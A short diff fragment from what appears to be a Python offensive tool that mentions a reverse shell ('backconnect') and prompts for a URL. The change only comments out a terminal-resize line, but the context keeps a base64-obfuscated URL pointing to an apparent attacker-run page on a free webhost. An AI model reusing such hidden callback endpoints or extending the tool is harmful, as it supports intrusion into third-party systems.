@@ -91,7 +91,7 @@ revese shell = backconnect
 yz = "aHR0cHM6Ly9sdWx6d2lwZXIuMDAwd2ViaG9zdGFwcC5jb20vc2hvd2Jvb2IucGhw"
 
 
-sys.stdout.write("\x1b[8;{rows};{cols}t".format(rows=100, cols=200))
+#sys.stdout.write("\x1b[8;{rows};{cols}t".format(rows=100, cols=200))
 
 
 sys.stdout.write("Url > ")
